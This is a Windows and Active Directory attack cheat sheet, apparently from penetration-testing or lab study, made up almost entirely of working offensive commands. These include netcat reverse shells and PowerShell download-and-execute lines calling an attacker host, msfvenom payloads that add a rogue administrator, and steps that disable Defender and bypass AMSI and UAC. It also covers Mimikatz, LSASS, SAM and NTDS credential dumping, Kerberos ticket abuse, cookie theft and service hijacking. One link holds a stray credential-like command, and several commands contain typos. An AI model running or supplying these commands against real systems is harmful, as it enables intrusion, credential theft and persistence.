# Windows
*   Shells & Payloads
    *   Metasploit 
        *   `msfconsole` → `search [COMPONENT]` → `use [EXPLOIT]` → `options`
        *   `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp`
        *   `set payload windows/[EMPTY/X64]/shell_[BIND/REVERSE]_tcp`
    *   Web Shells
        *   `ls -la /usr/share/webshells` + [Public Repository](https://github.com/nicholasaleks/webshells)
        *   ASP / ASPX / PHP / PL / RB / CFM / JSP / WAR (Tomcat)
    *   SMB / WebDAV
        *   `smbserv()`                                                                                  → Open Anonymous Server
        *   `cp /usr/share/windows-binaries/nc[32/64].exe .`      → Place NC in SMB Share
        *   `\\[KALI_IP]\nc64.exe -e cmd.exe [KALI_IP] [PORT]`  → Input NC Shell Payload
        *   WebDAV Method                                                                   → `webdavserv()` + `\\[KALI_IP]:8000\DavWWWRoot\`  
    *   Powershell
        *   `powershell -c iex(New-Object System.Net.WebClient).DownloadString('http://[SERVER]/[PS1_FILE]');[FUNCTION_CALL]`
        *   `powershell [-e / /enc] [B64_STRING]`                                         → [B64 Reverse Shell](https://www.revshells.com/)
        *   `echo '[CMD]' | iconv -f ascii -t utf-16le | base64 -w0`  → CMD to PS-B64 Conversion
        *   32/64-Bit Paths
            *   Try Both → `where powershell` / `set` → Infer Architecture
            *   `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
            *   `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
    *   Admin Hijacking
        *   `msfvenom -p windows/[x64/empty]/exec CMD="net user hacker pass123 /add" -f [FORMAT]`
        *   `msfvenom -p windows/[x64/empty]/exec CMD="net localgroup Administrators hacker /add" -f [FORMAT]`
        *   `msfvenom -p windows/[x64/empty]/exec CMD="net group [DOMAIN_GROUP] hacker /add" -f [FORMAT]`
        *   Remote Access → Add `hacker` to RDP / WinRM Groups
    *   SSH Hijacking
        *   `ssh-keygen -t ed25519 -f [KEY_FILE]` → Paste in `C:\Users\[USERNAME]\.ssh\authorized_keys`
        *   `chmod 600 [KEY_FILE]`
        *   `ssh -i [KEY_FILE] [USER]@[IP]`
    *   MSFVenom
        *   Executable Upload
            *   `metash()`
            *   IIS                    → ASP / ASPX
            *   CMD               → EXE / DLL / MSI / PS1
            *   Link/Macro   → HTA / VBA / VBS
            *   PHP                → `-p php/meterpreter/reverse_tcp -f raw`
            *   WAR               → `-p java/shell_reverse_tcp -f war`
            *   JSP                  → `-p java/shell_reverse_tcp -f raw`
        *   BOF Shellcode
            *   `-a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [32_BIT_ENCODER] -i 3 --smallest` → Place in Exploit
            *   Encoders           → `x86/shikata_ga_nai` / `x86/unicode_m`
            *   Extra Options   → `BufferRegister=EAX` / `Exitfunc=thread`
            *   Auto-Migration
                *   Useful when Process Crashes
                *   `echo "run post/windows/manage/migrate" > ~/automigrate.rc`
                *   In `multi/handler` MSF Panel → `set AutoRunScript multi_console_command -r ~/automigrate.rc`
*   File Transfers
    *   Writable Directories
        *   `c:\windows\temp\`
        *   `c:\windows\tracing\`
        *   `C:\windows\tasks\`
        *   `c\windows\system32\spool\drivers\color\`
    *   SMB / WebDAV
        *   `smbserv()` / `webdavserv()`
        *   `net use X: \\[KALI_IP]\Share [/user:hacker password]` → Transfer Data From `X:\`
        *   `\\[KALI_IP]:8000\DavWWWRoot\`
    *   HTTP
        *   `httpserv()`
        *   `certutil -urlcache -split -f "http://[KALI_IP]:8888/[SRC]" "[DEST]"` → [LOLBAS](https://lolbas-project.github.io/#)
        *   `powershell -c (New-Object System.Net.WebClient).DownloadFile('http://[KALI_IP]:8888/[SRC]', '[DEST]')`
        *   To Kali → `. .\PSUpload.ps1` + `Invoke-FileUpload -Uri http://[KALI_IP]:8888/[DEST] -File [SRC]`
    *   FTP
        *   `ftpserv()`
        *   `powershell -c (New-Object Net.WebClient).DownloadFile('ftp://[KALI_IP]:2121/[SRC]', '[DEST]')`
        *   To Kali → `(New-Object Net.WebClient).UploadFile('ftp://[KALI_IP]:2121/[DEST]', '[SRC]')`
    *   B64
        *   `cat [SRC] | base64 -w 0;echo` → `[IO.File]::WriteAllBytes("[DEST]", [Convert]::FromBase64String("[B64_DATA]"));`
        *   To Kali → `[Convert]::ToBase64String((Get-Content -path "[SRC]" -Encoding byte))` → `echo [B64] | base64 -d > [DEST]`   
    *   RDP
        *   `xfreerdp /v:[TARGET] /d:[DOM] /u:[USER] /p:[PASS] /drive:linux,[FOLDER_TO_SHARE]`
        *   Shared Access → `C:\[FOLDER_TO_SHARE]`
*   Evasion
    *   [Citrix / Kiosk Breakouts](https://academy.hackthebox.com/module/67/section/626)
    *   Powershell
        *   AMSI
            *   NXC Local Admin → `nxc smb [IP] [AUTH_STRING] -X '[PS_COMMAND]' --amsi-bypass [PAYLOAD_FILE]`
            *   [Payloads](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
            *   [One-Liners](https://amsi.fail/)
        *   AppLocker
            *   `Get-AppLockerPolicy -Effective | select -exp RuleCollections` → Run Scripts from Allowed Folders
            *   [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Try World Writable Folders
        *   CLanguage
            *   `$ExecutionContext.SessionState.LanguageMode`
            *   [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
        *   Execution Policy
            *   `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]` → Test B64 Also
            *   `Set-ExecutionPolicy Bypass -Scope Process`   
    *   [AV](https://book.hacktricks.xyz/windows-hardening/av-bypass)
        *   Enumeration
            *   `Get-MpComputerStatus`
            *   `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
        *   Exclusion Bypass
            *   `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
            *   Malware in Exclusion Folder
        *   Disable AV (RCE As Admin) 
            *   `powershell Set-MpPreference -DisableIOAVProtection $true`
            *   `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
        *   Malware Obfuscation
            *   `msfvenom -x whoami.exe -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe > out.exe`
            *   `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe > out.exe`
            *   MalvDev / [Killer](https://github.com/0xHossam/Killer) / [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html) / Shellter
    *   UAC
        *   Enumeration
            *   Member of "Administrators" + Restricted Privileges / Integrity Levels
            *   `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`
            *   `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
        *   Bypass
            *   `PsExec.exe -h -s -i cmd` / `psexec.py [AUTH_STRING]`
            *   `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626)
            *   GUI Access                                              → Application Escape / CMD “Run as Administrator” → Input Credentials
*   Domain Escalation
    *   Admin Hunting
        *   `Find-LocalAdminAccess`
        *   Credential Objects
            *   `$pass = ConvertTo-SecureString "[PASS]" -AsPlainText -Force`
            *   `$cred = New-Object -TypeName System.Management.Automation.PSCredential("[USER]", $pass)`
            *   `Invoke-Command -Cred $cred -ScriptBlock{[COMMAND]} -ComputerName [REMOTE_HOSTNAME]`
        *   PS Remoting
            *   `Enable-PSRemoting`
            *   `$sess = New-PSSession -ComputerName [REMOTE_HOSTNAME]`
            *   `Enter-PSSession -Session $sess [-Cred $cred]`
            *   File Transfers → `Copy-Item` + From/To Session Variable
        *   RCE
            *   `Invoke-WMIExec`
            *   `Invoke-SMBExec`
    *   Domain Roasting
        *   `Invoke-Rubeus -Command "asreproast /domain:[DOMAIN] /nowrap"`
        *   `Invoke-Rubeus -Command “kerberoast /domain:[DOMAIN] /nowrap”`
    *   DACL Abuse
        *   `Invoke-ACLScanner` / `Find-InterestingDomainACL`
        *   `Invoke-Bloodhound`
        *   [Exploitations 101](https://www.thehacker.recipes/ad/movement/dacl/) / [102](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
        *   DCSyncing → `Invoke-Mimikatz -Command "lsadump::dcsync /user:Administrator" exit`
    *   Unconstrained Delegation
        *   `Get-NetComputer -Unconstrained`
        *   `Invoke-Rubeus -Command "dump /nowrap"`
        *   `Invoke-Rubeus -Command "monitor /monitorinterval:10 /targetuser:dc1$ /nowrap"`
    *   MSSQL Instances
        *   `Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`
        *   [PowerUP-SQL Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
        *   [Exploitations](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql#mssql-basic-abuse)
    *   SMB Access
        *   Enumeration
            *   `Find-DomainShare -CheckShareAccess` 
            *   `Invoke-ShareFinder`
            *   `Invoke-FileFinder`
        *   Share Access
            *   `net use x: \\[HOST]\[SHARE] "[empty/password]" /u:[empty/Guest/user]`
        *   Scraping
            *   `Snaffler.exe -s -d [DOMAIN] -o snaffler.log -v data`
            *   `Snaffler.exe -s -i \\[HOST]\[SHARE]`
        *   LLMNR
            *   [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft)
            *   `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput`
            *   Cracking  → `hashcat -m 5600`
*   Users
    *   Authentication
        *   Local Passwords
            *   `net user [USERNAME]` → Check if member of `"Remote Management Users"`
            *   `$pass = ConvertTo-SecureString "[PASS]" -AsPlainText -Force`
            *   `$cred = New-Object -TypeName System.Management.Automation.PSCredential("[USER]", $pass)`
            *   `Invoke-Command -Cred $cred -ScriptBlock{[COMMAND]} -Computer localhost`
        *   NT Hashes
            *   `Invoke-Rubeus "asktgt /domain:[DOMAIN] /user:[USER] /rc4:[HASH] /ptt"`
            *   Password Conversion → `iconv -f ASCII -t UTF-16LE <(printf "[PASS]") | openssl dgst -md4`
            *   Cracking                         → `hashcat -m 1000`
        *   Service Hashes
            *   `Invoke-Rubeus "silver /service:[SPN] /rc4:[SRV_HASH] /user:Administrator /ldap /ptt"`
            *   Export Ticket → Impersonate Admin + [SPN Abuses](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#abusing-service-tickets)
        *   User Tickets
            *   `Invoke-Rubeus -Command "ptt /ticket:[KIRBI_TICKET/B64_STRING]"`
            *   B64 to Kirbi      → `[IO.File]::WriteAllBytes("[KIRBI_TICKET]", [Convert]::FromBase64String("[BASE64_TICKET]"))`
            *   Kirbi to B64      → `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[KIRBI_TICKET"]))`
    *   Enumeration
        *   `net user`                       → `net user [USER]`
        *   `net localgroup`           → `net localgroup [GROUP`
        *   `tree /a /f C:\users` → SSH / Sensitive Files / Vulnerable Applications & Data Folders
    *   RDP Hijacking (Local Admin)
        *   `query user` → Active RDP SESSIONNAME
        *   `sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:[SESSNAME]"`
        *   `net setart sesshijack`
    *   Permission Bypass
        *   `icacls [PROTECTED_FILE/FOLDER]` → Check `R/W/F` Access
        *   Take Ownership → `icacls [PROTECTED_FILE/FOLDER] /grant [USER]:F`
    *   Groups
        *   `whoami /groups` 
        *   Event Log Readers
            *   `wevtutil qe Seucrity /rd:true /f:text | findstr "/user"`
            *   `wevtutil qe Seucrity /rd:true /f:text /u:[USER] /p:[PASS] | findstr "/user"`
            *   `Get-WinEvent -LogName security | where {$_.ID -eq 4688 -and $_.Properties[8].Vaue -like '*/user*'} | Select-Object @{name='CommandLine';expression={$_.Properties[8].Value}}`
        *   [DNSAdmins](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
            *   RCE
                *   `dnscmd /config /serverlevelplugindll [MALICIOUS_DLL]` OR `kdns.c` + `mimilib.dll`
                *   `sc [stop/start] dns`
            *   LLMNR
                *   `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName [DC_HOST]`
                *   `Add-DnsServerResourceRecordA -Name wpad -ZoneName [DOM] -Computername [DC_HOST] -IPv4Address [RESPONDER_IP]`
        *   Hyper-V Administrators
            *   `.\hyperv-eop.ps1`   → Change `license.rtf` → Startable SYSTEM Service
            *   `sc stop [SERVICE]` → `takeown /F [SERVICE_EXE]` → Overwrite → `sc start [SERVICE]`
        *   Backup Operators
            *   `SeBackupPrivilege` → If Missing → UAC Bypass
            *   `SeBackup` Exploitation
        *   Print Operators
            *   `SeLoadDriverPrivilege` → If Missing → UAC Bypass
            *   `SeLoadDriverPrivilege` Exploitation (OS < Win10 - 1803)
        *   Server Operators
            *   Full Services Access 
            *   `SeBackupPrivilege`
            *   `SeRestorePrivilege`
        *   [Azure Admins](https://zflemingg1.gitbook.io/undergrad-tutorials/vulnhub-machines-oscp/untitled)
    *   Privileges
        *   `whoami /priv`
        *   Disabled Service Privilege   → [FullPowers](https://github.com/itm4n/FullPowers)
        *   Disabled User Privileges      → `EnableAllTokenPrivs.ps1` / `Set-TokenPrivilege.ps1`
        *   [Exploitation](https://github.com/gtworek/Priv2Admin)
            *   [SeImpersonate](https://github.com/BeichenDream/GodPotato) / [SeAssignPrimaryToken](https://github.com/antonioCoco/JuicyPotatoNG)
                *   `NT AUTHORITY\LocalService` / `NT AUTHORITY\NetworkService` 
                *   Churrasco
                *   JuicyPotato
                *   RoguePotato
                *   GodPotato / SweetPotato
                *   [PrintSpoofer](https://setuserinfo christopher.lewis 23 'Admin!23')
            *   [SeTakeOwnership](https://academy.hackthebox.com/module/67/section/642)
                *   Full Objects Access
                *   `takeown /f "[FILE/FOLDER]"`
                *   `icacls "[FILE/FOLDER]" /grant %username%:F`
            *   [SeLoadDriver](https://academy.hackthebox.com/module/67/section/605)
                *   [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)        → `EoPLoadDriver.exe System\CurrentControlSet\Capcom capcom.sys`
                *   [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) → Modify CPP → VS2019 Compiling → Execute Malware
            *   [SeDebug](https://github.com/decoder-it/psgetsystem)
                *   Credential Dumping
                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "lsadump::lsa /patch"'`
                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "vault::cred /patch"'`
                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "sekurlsa::logonpasswords"'`
                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "lsadump::secrets"'`
                    *   `Invoke-Mimikatz '"privilege::debug" "token:elevate" "lsadump::sam"'`
                *   LSASS DMP
                    *   `Get-Process lsass` → `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] [OUT.dmp] full`
                    *   GUI Access → Task Manager + “Create dump file” (LSASS)
                    *   Windows    → `Invoke-Mimikatz '"privilege::debug" "token:elevate" "sekurlsa::minidump [LSASS.dmp]"'`
                    *   Linux           → `pypykatz lsa minidump [LSASS.dmp]`
                *   SYSTEM RCE
                    *   PID → `tasklist /v /fi "username eq SYSTEM"`
                    *   `ipmo psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
                    *   [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) / [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
            *   [SeBackup](https://academy.hackthebox.com/module/67/section/601)
                *   `. .\SeBackupPrivilege[Utils+CmdLets].dll`
                *   `Set-SeBackupPrivilege`
                *   Protected File Copy
                    *   `robocopy /B [SRC] [DEST]`
                *   SAM Dumping
                    *   `reg save hklm\sam c:\windows\temp\sam.sav`
                    *   `reg save hklm\system c:\windows\temp\system.sav`
                    *   `samdump2 system.sav sam.sav`
                *   NTDS Dumping
                    *   `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\windows\temp' q q"`
                    *   `secretsdump.py -system [SYSTEM] -security [SECURITY] -ntds [NTDS] local`
                    *   Restic Method
                        *   `.\restic.exe -r C:\Windows\Temp\ntds backup C:\Windows --use-fs-snapshot`
                    *   Disk Shadow Method
                        *   `diskshadow.exe`
                        *   `set verbose on`
                        *   `set metadata C:\Windows\Temp\meta.cab`
                        *   `set context clientaccessible`
                        *   `set context persistent` 
                        *   `begin backup` 
                        *   `add volume C: alias cdrive`
                        *   `create`
                        *   `expose %cdrive% E:`
                        *   `end backup`
                        *   `exit`
                        *   `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
            *   [SeManageVolume](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9--------------------------------)
            *   [SeRestore](https://github.com/xct/SeRestoreAbuse)
    *   Credentials Hunting
        *   Repeat → From Local Admin
        *   Tools
            *   `Lazagne.exe all -oN`
            *   `Invoke-SessionGopher.ps1`
            *   [`https://github.com/carlospolop/MSF-Credentials`](https://github.com/carlospolop/MSF-Credentials)
            *   WinPEAS / PowerUP
        *   Hash Dumping (Local Admin)
            *   SeBackup Exploits
            *   SeDebug Exploits
        *   CMDKey Storage
            *   `cmdkey /list`
            *   `runas /savecred /user:[USER] "\\[KALI_IP]\Share\shell.exe"`
        *   PS Credential Files
            *   Extensions → `.cred`, `.xml`
            *   `$credential = Import-Clixml -Path [FILE.xml]`
            *   `$credential.GetNetworkCredential().[username/password]`
        *   Web Applications
            *   Web Roots            → `c:\xampp`, `c:\inetpub`, `C:\nginx`, `C:\Program Files (x86)`, `C:\Program Files`
            *   Host Mappings    → `default`, `000-default.conf`
            *   Log Files                → `[access/error].log`, `httpd-[access/error].log`, `httpd.conf`
            *   DB Files                 → `*[db/database/settings/config].*`, `*.db`, `.sql*`
            *   Code Analysis      → Sensitive Exposure / Docker Files / Inputs & Functions / Connection Strings / Dependencies
            *   Write Privileges   → WebShell + LOCAL/NETWORK Impersonate Escalation
        *   GIT Repositories
            *   Directories → `.git` / `.gitignore`
            *   `git log --oneline` 
            *   `git status`
            *   `git show [HASH]`
            *   `git diff [HASH_1] [HASH_2]`
        *   ADS Streams
            *   `dir /R [PATH]`
            *   `Get-Item * -Stream *`
            *   `Get-Content .\[FILE] -Stream [ADS_FILE]`
        *   File Hunting
            *   Content Search
                *   `findstr /SIM /C:"[password/pass/psw/pwd/credentials][=/:/',/",]" *.[EXT_OR_*]`
            *   Sensitive Files
                *   `dir /s/b /A:-D RDCMan.settings == *.rdp == web.config == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == *.db == db.* == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *password* == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == SiteList.xml == tomcat-users.xml == *.kdbx == *.config == FreeSSHDservice.ini == unattend.* == unattended.* == *.zip == *.rar == *.xls == *.xlsx == *.doc == *.docx == NetSetup.log == *sysprep.inf == *.vnc == *.cred == *sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == confCons.xml == SAM == SYSTEM == SECURITY https-xampp.conf == my.ini == creds.* == *credentials* == *password* == pass.* == my.cnf == access.log == error.log == server.xml == Groups.xml == ConsoleHost_history.txt == credentials.db == index.dat == access_tokens.db == legacy_credentials == accessTokens.json == *.bat == _*_.ps1 == id_rsa == *.kbdx == *.sql* == *.sql == pagefile.sys == *.vhd == *.vhdx == *.vmdk == *.ppk == azureProfile.json == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == *pass*.txt == *pass*.xml == *pass*.ini == *cred* == shadow == ntuser.dat == bash.exe == wsl.exe 2>nul | findstr /v “.dll”`
        *   Powershell Logging
            *   `dir /a /s /b ConsoleHost_history.txt` / `(Get-PSReadLineOption).HistorySavePath`
            *   `dir C:\Transcripts`
            *   `Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView`
            *   `Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview`
            *   `Get-Clipboard`
        *   Registry Keys
            *   `reg query [HKLM/HKCU] /f [password/pass/pwd] /t REG_SZ /s /[k/d]`
            *   `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
            *   `reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd"`
            *   `reg query “HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions”`
            *   `reg query "[HKLM/HKCU]\Software\Microsoft\Windows\CurrentVersion\Internet Settings"`
            *   `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"`
        *   Chrome/Firefox Sessions
            *   `SharpChrome.exe logins /unprotect`
            *   `Invoke-SharpChromium -Command "cookies slack.com"`
            *   `copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
            *   `python3 cookieextractor.py --dbpath [SQLITE_FILE] --host slack --cookie d`
        *   Backup Drives
            *   `restic.exe -r E:\backup snapshots`
            *   `restic.exe -r E:\backup restore [SNAPSHOT_ID] --target C:\Restored`
            *   `C:\Restored` → Credential Hunting 
        *   WiFI Passwords
            *   `netsh wlan show profile`
            *   `netsh wlan show profile [SSID] key=clear`
        *   Sticky Notes / Clipboard
            *   `c:\Users\[USER]\AppData\Roaming\Microsoft\Sticky Notes`
            *   `cd C:\users && dir /a /s /b *.sqlite`
            *   `Invoke-ClipboardLogger`
        *   [Exchange Inboxes](https://github.com/dafthack/MailSniper)
*   System
    *   Applications
        *   `wmic product get name,version`
        *   `dir /a /q "C:\Program Files" "C:\Program Files (x86)"` → Credentials & Exploit Research / Pivoting / Manual Exploits
        *   `cd C:\`                                                                                                 → Custom C Folders
        *   Application Data Folders
            *   Sensitive Extensions  → `.conf` / `.xml` / `.cnf` / `.config` / `.ini` / `.txt` / `.log` / Encrypted / Archives / SQL
            *   `C:\Users\[USERNAME]\AppData`
            *   `C:\ProgramData`
            *   `C:\ProgramData\Configs\*`
            *   `C:\Program Files\Windows Powershell\*`
            *   `%WINDIR%\System32\CCM\logs\*.log`
        *   CHM Hijacking
            *   `.chm` Files Exists → Check If `C:\Program Files (x86)\HTML Help Workshop` Installed
            *   [Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)           → `Out-CHM -Payload "c:\windows\temp\nc64.exe -e cmd [KALI_IP] [PORT]" -HHCPath "[HTML_HELP_WORKSHOP_PATH]`
            *   `listen [PORT]`    → Wait Callback
        *   Custom Binaries
            *   Reverse Engineering
            *   Local / [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF → MSFVenom
    *   OS
        *   Environment Variables
            *   `set` → PATH / Drives / Credentials / Architecture
            *   DLL Hijacking Folders
                *   `for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users %username%" && echo. )`
        *   Kernel Exploits
            *   `systeminfo` / `wmic qfe list brief`  → [Missing Hotfixes & KB Patches Checker](https://patchchecker.com) / Windows Server ≤ 2019
            *   Watson / WES-NG                                → Exploit Checker Tools
            *   [Sherlock](https://github.com/rasta-mouse/Sherlock)                                                → Old Kernels → `Find-AllVulns`
            *   [MS14-068](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/MS14-068/)                                              → Kerberos Local Escalation
            *   Meterpreter                                           → `use post/multi/recon/local_exploit_suggester` → `run`
        *   Process Migration
            *   Meterpreter Shell → `ps` → `svchost.exe` PID
            *   `migrate [PID]`       → `load priv` → `getsystem`
        *   Elevated Install
            *   `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
            *   `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
            *   `msiexec /quiet /qn /i [MALICIOUS.msi]`
        *   WSUS
            *   HTTP →    `reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer`
            *   Set to 1 → `reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer`
            *   [WSUSPicious](https://github.com/GoSecure/WSuspicious)
        *   HiveNightmare
            *   `icacls [SAM_FILE]` → Readable by `BUILTIN\Users`
            *   `HiveNightmare.exe` → GossiTheDog POC
            *   `secretsdump.py -sam SAM -system SYSTEM -security SECURITY local`
        *   UAC EoP
            *   GUI Access → [CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388) / [Support App](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#insecure-gui-apps)
            *   [Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#from-low-priv-user-to-nt-authority-system-cve-2019-1388-uac-bypass)
        *   Drivers
            *   OffensiveCSharp → `DriverQuery.exe --no-msft`
            *   Exploit Research
        *   SCClient
            *   `C:\Windows\CCM\SCClient.exe`
            *   `Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | % { if ($_.ApplicabilityState -eq "Applicable") { $_.Name } }`
    *   Network
        *   Local Services
            *   `netstat -ano` → Search For `127.0.0.1` / `::1` / `[INTRANET_IP]`
            *   DB Access / MySQL UDF Escalation / Configuration Files → Write Privilege (All Services)
            *   Port Forwarding
            *   Splunk Forwarder / Erlang Port (25672)
        *   [Dynamic Forwarding](https://notes.dollarboysushil.com/pivoting-and-tunneling/ligolo-ng)
            *   Intranet IP
                *   `ipconfig /all` 
                *   `10.x.x.x` / `192.168.x.x` / `172.[16-31].x.x`
            *   Lateral Hosts
                *   `route -n` → Intranet CIDR
                *   `arp -a`
        *   Traffic Sniffing
            *   `python net-creds.py -i [NIC]`
            *   TCPDump + PCAP Wireshark Analysis → All Unencrypted Protocols
    *   Scheduled Jobs
        *   Scripts
            *   `dir /a /q /s /b *.bat *.ps1`
            *   Scheduled Execution → Overwrite + Wait
        *   Tasks
            *   `schtasks /query /fo LIST /v | findstr /v "\Microsoft*" | findstr TaskName`
            *   `schtasks /query /fo LIST /v | findstr /v "\Microsoft*" | findstr [TASK_NAME_HERE]`
            *   `icacls` → (F/M/W) File/Folder Permissions → Overwrite + Wait / DLL Hijack
        *   PS Spying
            *   `$process = Get-WmiObject Win32_Process | Select-Object CommandLine`
            *   `Start-Sleep`
            *   `$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine`
            *   `Compare-Object -ReferenceObject $process -DifferenceObject $process2`
        *   Autoruns
            *   `wmic startup get caption,command 2>nul & ^`
            *   `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\[User] Shell Folders`
            *   `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "[Userinit/Shell]"`
            *   `icacls` → (F/M/W) File/Folder/Key Permissions → Overwrite + Wait Login / DLL Hijack
        *   CVE-2018-8440
            *   `icacls C:\Windows\Tasks` → `Authenticated Users: (RX,WD)`
            *   Metasploit                             → `use exploit/windows/local/alpc_taskscheduler` → Launch on MSF Session
    *   Services
        *   Enumeration
            *   Tools
                *   SharpUp  → `sharpup.exe audit`
                *   PowerUp → `Invoke-AllChecks`
                *   JAWS / Seatbelt / Invoke-PrivescCheck
            *   Manual
                *   `sc query` / `net start` / `Get-WMIObject Win32_Service`
                *   `cd HKLM:\system\currentcontrolset\services` → `dir`
                *   `wmic service get name,startmode,pathname | findstr /i /v “c:\windows\\”`
                *   `sc qc [SERVICE]`         → LocalSystem + Trigger Type
                *   `sc sdshow [SERVICE]` → `[RP/DC];;;[AU/BA/WD]`
                *   ACL Enumeration
                    *   `PS:> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "[USER] Users Path Everyone"`
            *   Triggers
                *   `MANUAL/DEMAND`   → `sc [stop/start] [SERVICE]`
                *   `AUTO`                     → SeShutdown + `shutdown /r /t 0`
        *   Exploitation
            *   `icacls` → (F/M/W) File/Folder Permissions → Overwrite Binary / [DLL Hijack](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)
            *   Unquoted Path                                                  → Malware in Folder
            *   BinPath Hijack
                *   `reg add HKLM\SYSTEM\CurrentControlSet\services\[SRV] /v ImagePath /t REG_EXPAND_SZ /d [MALWARE] /f`
                *   `sc config [SERVICE] binPath="[MALWARE/CMD]"`
                *   `sc config [SERVICE] depend=""`
                *   `sc config [SERVICE] obj=".\LocalSystem" password=""`
                *   Trigger Service
            *   PATH Hijacking
                *   Writable Folder       → `echo %PATH%`
                *   PowerUP                   → `FindPathDLLHijack`
                *   EXE/DLL In Folder   → Trigger Service
    *   Processes
        *   `tasklist /v /fi "username eq [SYSTEM/USER]"`
        *   `icacls` → (F/M/W) File/Folder Permissions → [Overwrite Binary / DLL Hijack](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes)
        *   Command Strings                                            → Credentials + Info Disclosure
        *   Electron / Chrome Debuggers
        *   Memory Dumping
            *   Unencrypted Services
            *   Browsers / Password Managers
            *   `procdump.exe -accepteula -ma [PROC_NAME]`
    *   Named Pipes
        *   `accesschk.exe /accepteula -w \\.\pipe\* -v` 
        *   Permissions → `GENERIC_WRITE / FILE_ALL_ACCESS`
        *   PrintNightmare
            *   `dir \\localhost\pipe\spoolss`
            *   `. .\CVE-2021-1675.ps1` → CalebStewart POC
